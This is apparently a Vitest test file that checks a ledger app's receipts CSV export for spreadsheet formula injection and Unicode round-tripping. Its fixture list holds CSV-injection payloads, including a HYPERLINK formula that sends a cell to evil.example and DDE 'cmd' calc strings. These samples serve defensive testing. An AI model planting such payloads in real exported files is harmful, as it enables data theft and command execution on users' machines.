import 'fake-indexeddb/auto';
/**
 * The receipts CSV with hostile and unusual counterparties, end to end (sprint_4 4.5; src/ledger/export-csv.ts;
 * Decisions [4.5]; Sprint 4 QA review, qa_tester priority 5). A counterparty is text a page or a pasted log gave, so it
 * is the cell an attacker controls. Built through `receiptsCsvBlob` from stored claims and read back with an RFC 4180
 * reader:
 *  - no cell a spreadsheet reads begins with `=`, `+`, `-` or `@`: such a counterparty is written after an apostrophe,
 *    and the rest of it is kept exactly;
 *  - a comma, a quote, an emoji, a combining mark, a right-to-left mark and a right-to-left script survive the round
 *    trip unchanged, each line has every column, and lines end in CRLF;
 *  - neither a person's mark's reason nor a subject hint is in the file (free text; the JSON export holds them).
 * Every value is invented.
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import type { LedgerDb } from '../../../src/ledger/db';
import { RECEIPT_CSV_COLUMNS, receiptsCsvBlob } from '../../../src/ledger/export-csv';
import { openLedger } from '../../../src/ledger/migrations';
import { putReceipt, upsertClaim } from '../../../src/ledger/repo';
import { claimId, makeClaim, makeReceipt, pinClock, releaseClock, sha, ulid, uniqueDbName } from './fixtures';

let db: LedgerDb;

beforeEach(async () => {
  pinClock('2026-10-08T17:00:00-04:00');
  db = await openLedger(uniqueDbName('export-csv-cells'));
});

afterEach(() => {
  db.close();
  releaseClock();
});

/** Counterparties a page or a log could hold: would-be formulas, then text that must survive as it is. */
const FORMULAS = [
  '=HYPERLINK("https://evil.example/?d="&A1,"Open")',
  '+1-555-0100',
  "-2+3+cmd|' /C calc'!A0",
  "@SUM(1+1)*cmd|' /C calc'!A0",
];
const PLAIN = [
  'Dana, "the" boss',
  'Zoë 😀 Okafor',
  'e\u0301lodie@example.org',
  '\u200fسارة@example.org',
  'Corner Shop',
];
const REASON = 'MARK-REASON-only-in-the-JSON';
const HINT = 'HINT-only-in-the-JSON';

/** RFC 4180: CRLF lines of comma-separated cells, a cell quoted when it holds a comma, a quote or a line break. */
function readCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let index = 0; index < text.length; index += 1) {
    const char = text.charAt(index);
    if (quoted) {
      if (char === '"' && text.charAt(index + 1) === '"') {
        cell += '"';
        index += 1;
      } else if (char === '"') quoted = false;
      else cell += char;
    } else if (char === '"') quoted = true;
    else if (char === ',') {
      row.push(cell);
      cell = '';
    } else if (char === '\r' && text.charAt(index + 1) === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      index += 1;
    } else cell += char;
  }
  expect(cell).toBe('');
  expect(row).toEqual([]);
  return rows;
}

async function store(): Promise<void> {
  const parties = [...FORMULAS, ...PLAIN];
  for (const [index, counterparty] of parties.entries()) {
    const n = index + 1;
    await upsertClaim(
      db,
      makeClaim({ rawHash: sha(100 + n), counterparty, subjectHint: `${HINT} ${String(n)}` }),
    );
    const base = makeReceipt({
      id: ulid(n),
      claimId: claimId(100 + n),
      inputsHash: sha(n),
      state: 'FINAL',
      finalAt: '2026-10-01T10:31:00-04:00',
      computedAt: `2026-10-01T10:${String(10 + n)}:00-04:00`,
    });
    // The first receipt carries a person's mark: its grade and instant are in the file, never its reason.
    await putReceipt(
      db,
      n === 1
        ? {
            ...base,
            state: 'USER_OVERRIDDEN',
            reasons: [...base.reasons, { code: 'override.user', params: { grade: 'NOT_FOUND' } }],
            override: {
              grade: 'NOT_FOUND',
              reason: REASON,
              at: '2026-10-01T12:00:00-04:00',
              previousState: 'FINAL',
            },
          }
        : base,
    );
  }
}

describe('the receipts CSV, cell by cell', () => {
  it('writes every would-be formula after an apostrophe, keeps every other counterparty exactly, and no reason or hint', async () => {
    await store();
    const text = await (await receiptsCsvBlob(db)).text();
    expect(text.endsWith('\r\n')).toBe(true);
    expect(text.replaceAll('\r\n', '')).not.toMatch(/[\r\n]/u);
    expect(text).not.toContain(REASON);
    expect(text).not.toContain(HINT);

    const [header, ...lines] = readCsv(text);
    expect(header).toEqual([...RECEIPT_CSV_COLUMNS]);
    expect(lines).toHaveLength(FORMULAS.length + PLAIN.length);
    for (const line of lines) {
      expect(line).toHaveLength(RECEIPT_CSV_COLUMNS.length);
      for (const value of line) expect(value, value).not.toMatch(/^[=+\-@\t\r]/u);
    }
    const column = (name: (typeof RECEIPT_CSV_COLUMNS)[number]) => RECEIPT_CSV_COLUMNS.indexOf(name);
    const parties = lines.map((line) => line[column('counterparty')]);
    expect(parties.sort()).toEqual([...FORMULAS.map((formula) => `'${formula}`), ...PLAIN].sort());
    const marked = lines.find((line) => line[column('receipt_id')] === ulid(1));
    expect([
      marked?.[column('state')],
      marked?.[column('override_grade')],
      marked?.[column('override_at')],
    ]).toEqual(['USER_OVERRIDDEN', 'NOT_FOUND', '2026-10-01T12:00:00-04:00']);
  });
});
